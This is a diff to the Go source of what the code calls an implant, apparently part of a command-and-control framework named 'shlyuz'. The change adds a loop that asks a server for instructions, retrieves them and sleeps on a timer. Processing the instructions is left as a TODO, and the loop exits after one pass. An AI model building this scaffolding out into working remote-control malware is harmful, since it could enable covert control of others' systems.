@@ -4,6 +4,7 @@ import (
 	"embed"
 	"log"
 	"sync"
+	"time"
 
 	"shlyuz/pkg/component"
 	"shlyuz/pkg/config"
@@ -20,6 +21,12 @@ import (
 //go:generate go build -o zombie ../../internal/zombie/pkg/zombie.go
 //go:embed *
 var configFs embed.FS
+
+type interactionCounter struct {
+	mu sync.Mutex
+	v  component.Component
+	t  transport.TransportMethod
+}
 
 // Initalizes the implant, reads the config, sets the values, initalizes the keys, etc
 func genComponentInfo() component.Component {
@@ -73,10 +80,8 @@ func main() {
 	}
 	Component.CmdChannel = make(chan []byte)
 
-	// TODO: Send the actual manifest
 	initFrame := transaction.GenerateInitFrame(Component)
 	transaction.RelayInitFrame(&Component, initFrame, transport)
-	// TODO: Currently triggers a crash in non debugging scenarios, as
 	serverReg, boolSuccess := transaction.RetrieveInitFrame(&Component, transport)
 	if !boolSuccess {
 		log.Println("server registration failed")
@@ -85,4 +90,20 @@ func main() {
 	log.Println(serverReg)
 
 	// TODO: Implement loop here to do the actual stuff
+	//  first we send a request for a command, then we retrieve a response
+	for {
+		instructionRequestFrame := transaction.RequestInstruction(&Component, transport)
+		transaction.RelayInstructionFrame(&Component, instructionRequestFrame, transport)
+		instructionFrame, err := transaction.RetrieveInstruction(&Component, transport)
+		if err != nil {
+			log.Println("invalid instruction received: ")
+			log.Println(err)
+			time.Sleep(time.Duration(Component.Config.TskChkTimer))
+			break
+		}
+		transaction.RelayInstructionFrame(&Component, instructionFrame, transport)
+		// TODO: Process instruction
+		time.Sleep(time.Duration(Component.Config.TskChkTimer))
+		break
+	}
 }
